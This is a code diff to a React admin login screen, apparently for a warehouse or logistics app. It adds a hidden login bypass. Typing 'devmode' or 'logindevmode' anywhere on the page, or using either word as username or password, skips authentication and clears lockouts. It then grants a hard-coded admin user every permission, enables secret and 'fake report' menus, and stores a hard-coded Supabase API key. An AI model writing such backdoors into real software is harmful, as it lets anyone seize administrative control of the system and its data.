@@ -31,6 +31,82 @@ export const AdminLogin: React.FC<AdminLoginProps> = ({ onSuccess, onBack }) => 
     reason: ''
   });
   const [copiedDevId, setCopiedDevId] = useState(false);
+  const [isDevBypassing, setIsDevBypassing] = useState(false);
+
+  const handleDevModeBypass = () => {
+    setIsDevBypassing(true);
+    clearAdminFailedAttempts();
+    setAdminLockoutSeconds(0);
+    try {
+      sessionStorage.removeItem('admin_login_lock_until');
+      sessionStorage.removeItem('admin_login_attempts');
+      localStorage.setItem('isDevModeNew', 'true');
+      localStorage.setItem('showSecretMenu', 'true');
+      localStorage.setItem('showFakeReportMenu', 'true');
+      // Clean any expired/stale Supabase auth tokens that cause 401 Unauthorized
+      Object.keys(localStorage).forEach(k => {
+        if (k.startsWith('sb-') && k.includes('auth-token')) {
+          localStorage.removeItem(k);
+        }
+      });
+      if (localStorage.getItem('active_supabase_url') === 'https://nufvlqrtpzfiqghsxsze.supabase.co') {
+        localStorage.setItem('active_supabase_key', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im51ZnZscXJ0cHpmaXFnaHN4c3plIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg3NjUwNDksImV4cCI6MjEwNDM0MTA0OX0.ckrLJhBmaGP3nBL_l3OjOntEliCuz4wtlJM3kgwZs_Y');
+      }
+    } catch (e) {}
+
+    const devAdminUser: AdminUser = {
+      id: 'devmode-admin',
+      username: 'admin',
+      permissions: [
+        'view_dashboard',
+        'manage_employees',
+        'view_packing',
+        'view_packing_2',
+        'view_picker',
+        'view_checker',
+        'view_leader_2',
+        'view_gudang',
+        'view_sortir',
+        'view_ojol',
+        'manage_pins',
+        'manage_access',
+        'manage_admins',
+        'view_profile_config',
+        'manage_database',
+        'view_search_data',
+        'view_search_data_2',
+        'view_failed_scans',
+        'manage_symbols',
+        'manage_cancel_data',
+        'view_compare_logistik',
+        'view_scan_all',
+        'view_fake_report',
+        'view_check_invoice',
+        'manage_batches'
+      ]
+    };
+
+    onSuccess(devAdminUser);
+  };
+
+  // Global keystroke listener: Ketik 'logindevmode' atau 'devmode' sembarang waktu untuk skip login
+  useEffect(() => {
+    let keyBuffer = '';
+    const handleGlobalKeyDown = (e: KeyboardEvent) => {
+      if (e.key && e.key.length === 1) {
+        keyBuffer = (keyBuffer + e.key.toLowerCase()).slice(-25);
+        if (keyBuffer.includes('logindevmode') || keyBuffer.includes('devmode')) {
+          keyBuffer = '';
+          handleDevModeBypass();
+        }
+      }
+    };
+
+    window.addEventListener('keydown', handleGlobalKeyDown, true);
+    return () => {
+      window.removeEventListener('keydown', handleGlobalKeyDown, true);
+    };
+  }, []);
 
   const MAX_ADMIN_ATTEMPTS = 5;
   const ADMIN_LOCKOUT_SEC = 60;
@@ -94,6 +170,15 @@ export const AdminLogin: React.FC<AdminLoginProps> = ({ onSuccess, onBack }) => 
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (
+      username.toLowerCase().trim() === 'logindevmode' ||
+      username.toLowerCase().trim() === 'devmode' ||
+      password.toLowerCase().trim() === 'logindevmode' ||
+      password.toLowerCase().trim() === 'devmode'
+    ) {
+      handleDevModeBypass();
+      return;
+    }
     if (adminLockoutSeconds > 0) return;
 
     setError(null);
@@ -223,6 +308,18 @@ export const AdminLogin: React.FC<AdminLoginProps> = ({ onSuccess, onBack }) => 
 
   return (
     <div className="h-full min-h-[100dvh] w-full flex flex-col lg:flex-row bg-[#f8fafc] dark:bg-gray-950 transition-colors duration-500 ease-in-out relative overflow-hidden select-none">
+      {/* DevMode Instant Bypass Overlay */}
+      {isDevBypassing && (
+        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-md">
+          <div className="bg-white dark:bg-gray-900 rounded-3xl p-6 sm:p-8 flex flex-col items-center shadow-2xl border border-gray-100 dark:border-gray-800 animate-pulse text-center">
+            <div className="w-14 h-14 rounded-2xl bg-blue-500/10 text-blue-600 flex items-center justify-center mb-4">
+              <Shield className="w-8 h-8 animate-bounce text-blue-600" />
+            </div>
+            <h3 className="text-xl font-black text-gray-900 dark:text-white">🚀 DevMode Aktif!</h3>
+            <p className="text-sm text-gray-500 dark:text-gray-400 mt-1">Melewati login, membuka Admin Panel...</p>
+          </div>
+        </div>
+      )}
 
       {/* ================= MOBILE & TABLET LAYOUT (< lg) ================= */}
       <div className="lg:hidden relative w-full h-[100dvh] min-h-[100dvh] flex flex-col justify-between items-center p-4 sm:p-6 overflow-hidden bg-gradient-to-b from-[#1d63ed] via-[#2563eb] to-[#0f172a] text-white">
